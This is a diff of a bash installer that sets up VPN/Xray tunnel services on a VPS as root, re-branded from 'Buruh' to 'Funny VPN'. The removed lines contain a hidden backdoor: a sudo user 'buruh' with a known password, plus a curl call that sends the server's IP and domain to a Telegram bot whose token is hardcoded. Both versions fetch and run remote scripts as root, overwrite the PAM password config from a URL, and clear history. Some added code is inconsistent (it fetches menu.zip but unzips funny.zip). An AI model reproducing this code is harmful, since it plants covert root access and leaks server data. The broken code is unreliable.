@@ -1,91 +1,17 @@
 #!/bin/bash
-### Color
-Green="\e[92;1m"
-RED="\033[31m"
-YELLOW="\033[33m"
-BLUE="\033[36m"
-FONT="\033[0m"
-GREENBG="\033[42;37m"
-REDBG="\033[41;37m"
-OK="${Green}--->${FONT}"
-ERROR="${RED}[ERROR]${FONT}"
-GRAY="\e[1;30m"
-NC='\e[0m'
-red='\e[1;31m'
-green='\e[0;32m'
-# ===================
+#Funnyvpn
+#Rerechan02
+#Rayzell25
+#Nuralfiya
+#em0zz
+#naravpn.com
+#indo-ssh.com
+#indossh
+#Skc
 clear
-  # // Exporint IP AddressInformation
-export IP=$( curl -sS ipinfo.io/ip )
+#=========================================================================================================================
 
-# // Clear Data
-clear
-clear && clear && clear
-clear;clear;clear
-
-  # // Banner
-echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "  Welcome To Buruh Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
-echo -e "     This Will Quick Setup VPN Server On Your Server"
-echo -e "         Aother : ${green}Script  ${NC}${YELLOW}(${NC} ${green}tunnel ${NC}${YELLOW})${NC}"
-echo -e "       © Recode BY Buruh Store ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
-echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo ""
-sleep 8
-###### IZIN SC 
-ipsaya=$(wget -qO- ipinfo.io/ip)
-data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
-date_list=$(date +"%Y-%m-%d" -d "$data_server")
-data_ip="https://raw.githubusercontent.com/Sartamp/ipkusu/main/ipvps"
-run_izin() {
-  useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
-  if [[ $date_list < $useexp ]]; then
-    echo -ne
-  else
-    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
-    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-    echo -e ""
-    echo -e "            ${RED}PERMISSION DENIED !${NC}"
-    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
-    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
-    echo -e "             \033[0;33mContact Admin :${NC}"
-    echo -e "      \033[0;36mTelegram${NC} t.me/Buruh_vpn"
-    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6282328613478"
-    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-    exit
-  fi
-}
-# // Checking Os Architecture
-if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
-    echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
-else
-    echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
-    exit 1
-fi
-
-# // Checking System
-if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
-    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
-    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-else
-    echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-    exit 1
-fi
-
-# // IP Address Validating
-if [[ $IP == "" ]]; then
-    echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
-else
-    echo -e "${OK} IP Address ( ${green}$IP${NC} )"
-fi
-
-# // Validate Successfull
-echo ""
-read -p "$( echo -e "Press ${GRAY}[ ${NC}${green}Enter${NC} ${GRAY}]${NC} For Starting Installation") "
-echo ""
-clear
+run_eula() {
 if [ "${EUID}" -ne 0 ]; then
 		echo "You need to run this script as root"
 		exit 1
@@ -98,91 +24,64 @@ if [ -f "/etc/xray/domain" ]; then
 echo "Script Already Installed"
 exit 1
 fi
-red='\e[1;31m'
-green='\e[0;32m'
-NC='\e[0m'
-#IZIN SCRIPT
-MYIP=$(curl -sS ipv4.icanhazip.com)
-echo -e "\e[32mloading...\e[0m"
-clear
-#IZIN SCRIPT
-MYIP=$(curl -sS ipv4.icanhazip.com)
-echo -e "\e[32mloading...\e[0m" 
-clear
-# Version sc
-clear
-#########################
-# USERNAME
-rm -f /usr/bin/user
-username=$(curl https://raw.githubusercontent.com/Sartamp/ipkusu/main/ipvps | grep $MYIP | awk '{print $2}')
-echo "$username" >/usr/bin/user
-expx=$(curl https://raw.githubusercontent.com/Sartamp/ipkusu/main/ipvps | grep $MYIP | awk '{print $3}')
-echo "$expx" >/usr/bin/e
-# DETAIL ORDER
-username=$(cat /usr/bin/user)
-oid=$(cat /usr/bin/ver)
-exp=$(cat /usr/bin/e)
-clear
-# CERTIFICATE STATUS
-d1=$(date -d "$valid" +%s)
-d2=$(date -d "$today" +%s)
-certifacate=$(((d1 - d2) / 86400))
-# VPS Information
-DATE=$(date +'%Y-%m-%d')
-datediff() {
-    d1=$(date -d "$1" +%s)
-    d2=$(date -d "$2" +%s)
-    echo -e "$COLOR1 $NC Expiry In   : $(( (d1 - d2) / 86400 )) Days"
-}
-mai="datediff "$Exp" "$DATE""
-
-# Status ExpiRED Active
-Info="(${green}Active${NC})"
-Error="(${RED}ExpiRED${NC})"
-today=`date -d "0 days" +"%Y-%m-%d"`
-Exp1=$(curl https://raw.githubusercontent.com/Sartamp/ipkusu/main/ipvps | grep $MYIP | awk '{print $4}')
-if [[ $today < $Exp1 ]]; then
-sts="${Info}"
-else
-sts="${Error}"
-fi
-echo -e "\e[32mloading...\e[0m"
-clear
-# REPO    
-    REPO="https://raw.githubusercontent.com/Sartamp/v5/main/"
-
-run_domain() {
-echo -e ""
-clear
-    echo -e "   .----------------------------------."
-echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
-echo -e "   '----------------------------------'"
-echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
-echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
-echo -e "   ------------------------------------"
-read -p "   Please select numbers 1-2 or Any Button(Random) : " host
-echo ""
-if [[ $host == "1" ]]; then
-echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
-read -p "   Subdomain: " host1
-echo "IP=" >> /var/lib/ah/ipvps.conf
-echo $host1 > /etc/xray/domain
-echo $host1 > /root/domain
-echo ""
-elif [[ $host == "2" ]]; then
-#install cf
-wget ${REPO}cf.sh && chmod +x cf.sh && ./cf.sh
-rm -f /root/cf.sh
-clear
-else
-print_install "Random Subdomain/Domain is Used"
-wget ${REPO}cf.sh && chmod +x cf.sh && ./cf.sh
-rm -f /root/cf.sh
-clear
-    fi
 }
 
+run_funny() {
+#Create Folder
+mkdir /etc/slowdns
+mkdir /etc/xray
+mkdir /etc/websocket
+mkdir /etc/xray
+mkdir /etc/funny
+mkdir /etc/funny/trojan
+mkdir /etc/funny/vless
+mkdir /etc/funny/vmess
+mkdir /etc/funny/limit
+mkdir /etc/funny/socks5
+mkdir /etc/funny/limit/trojan
+mkdir /etc/funny/limit/vless
+mkdir /etc/funny/limit/vmess
+mkdir /etc/funny/limit/ssh
+mkdir /etc/funny/limit/sosck5
+mkdir /etc/funny/limit/socks5/ip
+mkdir /etc/funny/limit/socks5/quota
+mkdir /etc/funny/limit/ssh/ip
+mkdir /etc/funny/limit/trojan/ip
+mkdir /etc/funny/limit/trojan/quota
+mkdir /etc/funny/limit/vless/ip
+mkdir /etc/funny/limit/vless/quota
+mkdir /etc/funny/limit/vmess/ip
+mkdir /etc/funny/limit/vmess/quota
+mkdir /etc/funny/log
+mkdir /etc/funny/log/trojan
+mkdir /etc/funny/log/vless
+mkdir /etc/funny/log/vmess
+mkdir /etc/funny/log/ssh
+mkdir /etc/funny/log/socks5
+mkdir /etc/funny/cache
+mkdir /etc/funny/cache/trojan-tcp
+mkdir /etc/funny/cache/trojan-ws
+mkdir /etc/funny/cache/trojan-grpc
+mkdir /etc/funny/cache/vless-ws
+mkdir /etc/funny/cache/vless-grpc
+mkdir /etc/funny/cache/vmess-ws
+mkdir /etc/funny/cache/vmess-grpc
+mkdir /etc/funny/cache/vmess-ws-orbit
+mkdir /etc/funny/cache/vmess-ws-orbit1
+mkdir /etc/funny/cache/socks5
 clear
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "$green          Input Domain              	$NC"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+read -p "Input Your SubDomain : " domain
+echo "$domain" > /root/scdomain
+echo "$domain" > /etc/xray/scdomain
+echo "$domain" > /etc/xray/domain
+echo "$domain" > /etc/v2ray/domain
+echo "$domain" > /root/domain
+clear
+}
+
 run_tools() {
 #update
 ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
@@ -279,7 +178,7 @@ organizationalunit=none
 commonname=none
 email=none
 # simple password minimal
-wget -O /etc/pam.d/common-password "https://github.com/Rerechan02/last/raw/main/password"
+wget -O /etc/pam.d/common-password "https://github.com/Sartamp/v5/raw/main/password"
 chmod +x /etc/pam.d/common-password
 # go to root
 cd
@@ -345,8 +244,8 @@ echo "neofetch" >> .profile
 apt -y install nginx php php-fpm php-cli php-mysql libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/nginx/nginx.conf ${REPO}nginx.conf
-wget -O /etc/nginx/conf.d/xray.conf ${REPO}xray.conf
+wget -O /etc/nginx/nginx.conf https://raw.githubusercontent.com/Sartamp/v5/main/nginx.conf
+wget -O /etc/nginx/conf.d/xray.conf https://raw.githubusercontent.com/Sartamp/v5/main/xray.conf
 sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
 wget -O /var/www/html/index.html https://github.com/Rerechan02/Rerechan02.github.io/raw/main/index.html
 sed -i 's/listen = \/var\/run\/php-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/fpm/pool.d/www.conf
@@ -362,19 +261,19 @@ wget -O /home/vps/public_html/index.html "https://github.com/Rerechan02/Rerechan
 cd /usr/bin
 rm -fr menu
 rm -fr /usr/sbin/menu
-wget ${REPO}menu.zip
-unzip menu.zip
-rm -fr menu.zip
+wget https://raw.githubusercontent.com/Sartamp/v5/main/menu.zip
+unzip funny.zip
+rm -fr funny.zip
 chmod +x *
 clear
 cd /usr/local/bin
-wget ${REPO}ws.zip
+wget https://raw.githubusercontent.com/Sartamp/v5/main/ws.zip
 unzip ws.zip
 rm -fr ws.zip
 chmod +x *
 chmod +x /usr/bin/*
 cd /etc/systemd/system
-wget ${REPO}service.zip
+wget https://raw.githubusercontent.com/Sartamp/v5/main/service.zip
 unzip service.zip
 rm -fr service.zip
 systemctl daemon-reload
@@ -475,7 +374,7 @@ apt autoremove -y
 rm -fr /etc/issue.net
 cat> /etc/issue.net << END
 <br><font color="blue"><b>===============================</br></font><br>
-<font color="red"><b>********  AutoScript VPN  ********</b></font><br>
+<font color="red"><b>********  Funny VPN  ********</b></font><br>
 <font color="blue"><b>===============================</br></font><br>
 END
 cd
@@ -616,61 +515,30 @@ rm -fr /root/*
 touch /root/.system
 history -c
 echo "1.2" > /home/ver
+echo " "
 clear
-userdel jame > /dev/null 2>&1
-Username="buruh"
-Password=buruh
-mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
-### BOT INFORMATION
-CHATID="5795571992"
-KEY="6079069898:AAGT8hggC62cVoeKq1Q1k37sWj2Bys5NL1M"
-TIME="10"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="
-Detail Install Script
-==================================
-IP VPS: $MYIP
-Domain: $domain
-Date: $DATE2
-Client Name: $nama
-Expired: $tanggal
-==================================
-"
-clear
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-echo ""
-clear
-echo -e "
-Detail Install Script
-==================================
-IP VPS        : $MYIP
-Domain        : $domain
-Date & Time   : $DATE2
-Client Name   : $nama
-Expired       : $tanggal
-==================================
-     <= Wajib di baca & lakukan =>
-==================================
-Port login VPS dari 22 di ganti ke 3303
-karna kalo login vps make port 22 gamoang kena brute force
-Untuk membuka panel AutoSC Masukan
-perintah ( funny ) tanpa tanda kurung
-==================================
-"
-read -p "Pres enter untuk reboot : " ieieie
+echo -e "Intsall Berhasil dan lancar" 
+echo -e "" 
+echo -e "     <= Wajib di baca & lakukan =>" 
+echo -e "Port login VPS dari 22 di ganti ke 3303" 
+echo -e "karna kalo login vps make port 22 gampang kena brute force" 
+echo -e "" 
+echo -e "Untuk membuka panel AutoSC Masukan" 
+echo -e "perintah ( funny ) tanpa tanda kurung" 
+echo -e "" 
+read -p "Pres enter untuk reboot : " ieieie 
 touch /root/system
 reboot
 }
 
-run_izin
+run_pensi() {
 run_eula
-run_domain
 run_tools
 run_funny
 run_ayato
 run_cantikva
 run_indo
 run_xiangling
+}
+
+run_pensi
